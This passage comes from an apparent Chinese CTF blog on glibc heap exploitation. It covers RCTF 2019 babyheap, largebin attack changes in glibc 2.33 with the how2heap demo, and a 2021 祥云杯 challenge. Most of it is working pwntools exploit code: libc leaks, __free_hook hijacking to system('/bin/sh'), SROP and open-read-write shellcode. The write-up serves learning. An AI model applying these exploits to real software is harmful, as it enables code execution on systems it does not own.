class="line">add(<span class="number">0x4d8</span>)    <span class="comment">#8 </span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)       <span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x40</span>)     <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)   </span><br><span class="line">add(<span class="number">0x4e8</span>)    <span class="comment">#2</span></span><br><span class="line">free(<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      </span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="RCTF-2019-babyheap"><a class="header-anchor" href="#RCTF-2019-babyheap">¶</a>RCTF 2019 babyheap</h3>
<h4 id="题目考点-v2"><a class="header-anchor" href="#题目考点-v2">¶</a>题目考点</h4>
<pre><code>1.chunk overlap
2.largebin attack
3.off by null
4.SROP
5.shellcode 编写
</code></pre>
<h4 id="题目分析-v2"><a class="header-anchor" href="#题目分析-v2">¶</a>题目分析</h4>
<p>本题的漏洞点和上一题相似，但比上一题稍难，本题同样禁用了fastbin，同时还开启了沙盒保护禁用了59号系统调用,这意味着我们无法利用system直接getshell,所以想到利用orw来读flag。题目给出了show函数，可以利用off by漏洞来泄露libc,利用house of storm劫持__free_hook，利用srop修改__free_hook处的权限的内存权限，最后将我们的shellcode植入，来读取flag</p>
<p>step1<br>
泄露libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x100</span>)) <span class="comment"># set prev_size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x160</span>)</span><br></pre></td></tr></table></figure>
<p>说一下都做了什么：申请0，1，2号块，申请3号块防止合并，利用off by null 修改chunk2的p_size绕过unlink检查，释放2号块，此时0，1，2号块都进入unsortedbin，申请回0号块，此时1号块中储存的就是main_arena_xx的地址，show chunk1 就能得到libc地址了，最后再将2号块申请回来</p>
<p>Step2: house of Storm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)  <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#11</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x4e0</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#12</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#6</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">content_addr = free_hook</span><br><span class="line">fake_chunk =  content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)</span><br><span class="line">edit(<span class="number">11</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure>
<p>Step3: SROP(目前还不会，等学会了来填这个坑)</p>
<p>下面摘自EX师傅的博客，主要目的是把__free_hook地址设置为setcontext函数，从而控制程序流执行mprotect函数把__free_hook所在内存也修改为可执行，然后读入我们新的shellcode，在跳到新的shellcode去执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_execve_env = __free_hook &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, %d</span></span><br><span class="line"><span class="string">mov edx, 0x1000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % new_execve_env</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + p64(__free_hook + <span class="number">0x10</span>) + asm(shellcode1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定机器的运行模式</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 设置寄存器</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = __free_hook_addr + <span class="number">8</span></span><br><span class="line">frame.rip = libc_addr + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>] <span class="comment"># 0xa8 rcx</span></span><br><span class="line">frame.rdi = new_execve_env</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>, <span class="built_in">str</span>(frame))</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e ;// ./flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// ./flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;// 置0就行</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;// 读到栈上</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode2))</span><br></pre></td></tr></table></figure>
<p>####EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 咕咕咕</span></span><br></pre></td></tr></table></figure>
<h2 id="glibc-2-33-malloc-c部分源码分析"><a class="header-anchor" href="#glibc-2-33-malloc-c部分源码分析">¶</a>glibc 2.33 malloc.c部分源码分析</h2>
<p>相较于glibc2.23，glibc2.33的malloc.c中针对，largebin 新增了两个检查(这个检查在glibc2.30时被加入)</p>
<p>部分源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">    &#123;</span><br><span class="line">      victim_index = smallbin_index (size);</span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim_index = largebin_index (size);</span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">  &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">              <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                &#123;</span><br><span class="line">                  fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk;</span><br><span class="line">              <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  mark_bin (av, victim_index);</span><br><span class="line">  victim-&gt;bk = bck;</span><br><span class="line">  victim-&gt;fd = fwd;</span><br><span class="line">  fwd-&gt;bk = victim;</span><br><span class="line">  bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>新增检查如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这直接导致之前的large bin attack 无法使用，</p>
<p>在目前的2.3+版本的largebin attack 主要利用的是以下分支，该分支可以向任意地址写入一个堆地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>利用原理如下:</p>
<p>当我们即将要进入largebin的chunk的大小小于largebin中最小的一个chunk时会进入上述判断</p>
<p>其中fwd为large bin 的链表头,bck是largebin中最小的那个chunk,victim是我们当前插入的堆块</p>
<p>因为有victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;所以有fwd-&gt;fd-&gt;bk_nextsize-&gt;fd_nextsize = victim;fwd-&gt;fd刚好是我们largebin中的第一块,如果我们可以控制并修改其bk_nextsize为我们的fakechunk-0x20,则会有(fakechunk-0x20)-&gt;fd_nextsize = victim 即fakechunk = victim,这样我们就可以控制fakechunk附近的地址空间了</p>
<h2 id="how2heap-largebin-attack-for-2-33"><a class="header-anchor" href="#how2heap-largebin-attack-for-2-33">¶</a>how2heap largebin attack for 2.33</h2>
<p>代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;p2 address (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析</p>
<p>Step1: 定义一个target并赋值为0</p>
<p>Step2: 申请p1=0x428 p2=0x418，g1,g2用于防止堆块合并</p>
<p>Step3: 释放p1进入unsorted bin,申请g3=0x438发生unsorted bin遍历，由于p1&lt;0x438，p1将会直接进入largebin</p>
<p>Step4: 释放p2进入unsorted bin</p>
<p>Step5: 修改p1<a href="http://static.zybuluo.com/hgggg/nuka4g6wb1f0exchdwyek2r9/3.png">3</a>即p1的bk_nextsize 为target-0x20</p>
<p>Step6: 申请g4=0x438,发生unsorted bin遍历，会将p2链入进large bin，由于p2小于p1，所以会进入如下分支</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
<p>最后会有(target-0x20)-&gt;fd_nextsize = p2<br>
即target = p2<br>
相当于向target中写入了p2的地址</p>
<p>程序运行结果如下：<br>
<img src="http://static.zybuluo.com/hgggg/o5gkhadyyt9y9l9kwdtzebi3/image_1fj24revc10d3vqt14gd1e8d101i9.png" alt="image_1fj24revc10d3vqt14gd1e8d101i9.png-15.3kB"></p>
<h2 id="例题2"><a class="header-anchor" href="#例题2">¶</a>例题2</h2>
<h3 id="2021-祥云杯-PassWorbox-ProVersion"><a class="header-anchor" href="#2021-祥云杯-PassWorbox-ProVersion">¶</a>[2021 祥云杯]PassWorbox ProVersion</h3>
<h4 id="题目分析-v3"><a class="header-anchor" href="#题目分析-v3">¶</a>题目分析</h4>
<p>这题第一次做时是用的house of banana做出来的，后来看到大佬写的wp发现largebin attack也可以做</p>
<p>add<br>
<img src="http://static.zybuluo.com/hgggg/rfpg2n94hrkhqrdjxq9ao891/image_1fj5dk0g2kod1bbl1osd112er0t9.png" alt="image_1fj5dk0g2kod1bbl1osd112er0t9.png-68.8kB"></p>
<p>限制申请堆块大小只能为large chunk 大小，且会讲content通过encode函数加密</p>
<p>endcode函数如下<br>
<img src="http://static.zybuluo.com/hgggg/gpg6bf6nt9a4gfp5g11tzwjt/image_1fj5dvb0319dtkrp8cn1juo1bjrm.png" alt="image_1fj5dvb0319dtkrp8cn1juo1bjrm.png-29kB"><br>
讲明文分为八位一组与key进行异或加密，且key为rand随机生成</p>
<p>同时还给了一个recover 函数<br>
<img src="http://static.zybuluo.com/hgggg/sc5u9itdujsc1sbb7ht6sga3/image_1fjht6assapj1j73req20ajk49.png" alt="image_1fjht6assapj1j73req20ajk49.png-25.3kB"><br>
这个函数可以回复被释放掉的堆块的标志位，可以用来UAF</p>
<p>delete,edit,show都是正常的功能</p>
<h4 id="解题步骤-v2"><a class="header-anchor" href="#解题步骤-v2">¶</a>解题步骤</h4>
<p>Step1:获取key<br>
利用fgets的特性，当输入\n时，fgets会用\x00来填充剩下的size，0 ^ key = key来得到key</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<p>Step2:leak libc<br>
将chunk0释放到unsorted bin中，利用UAF得到libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br></pre></td></tr></table></figure>
<p>Step3:largebin attack<br>
我们已知可以利用largebin attack 在任意地址写入一个堆地址，那么往哪里写呢？</p>
<p>这里可以攻击mp_结构体<br>
mp_结构体如下<br>
<img src="http://static.zybuluo.com/hgggg/bm1c6bg7fga4cixex30gwjue/1.png" alt="1.png-27.5kB"></p>
<p>mp_.tcache_bins其实就时只允许的最大tcache chunk大小，如果释放的chunk小于mp_.tcache_bins那么就会被当作tcache bin来处理</p>
<p>那我们就可以将一个chunk的地址写入到tcahe_bins的位置，来伪造其值，由于chunk的地址作为值大小都非常大，我们的large chunk也会被当作tcache chunk来处理，那我们就可以利用tcache double free劫持__free_hook来getshell了</p>
<p>由于mp_结构体的偏移无法利用libc.symbol计算，这里给出计算方法<br>
<img src="http://static.zybuluo.com/hgggg/ee3egiy828wap8m9po5fyt3f/2.png" alt="2.png-47.4kB"></p>
<p>这样我们就能得到mp_+72的地址，再利用distance计算偏移，tcache_bins在mp_+80的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>) <span class="comment">#chunk0 -&gt; largebin</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_base + <span class="number">0x1eb280</span> + <span class="number">0x50</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
<p>Step4: 劫持free_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">recover(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x500</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>, p64(system))</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h4 id="完整exp"><a class="header-anchor" href="#完整exp">¶</a>完整exp</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;pwdPro&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28114)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdPro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Add&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Edit:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    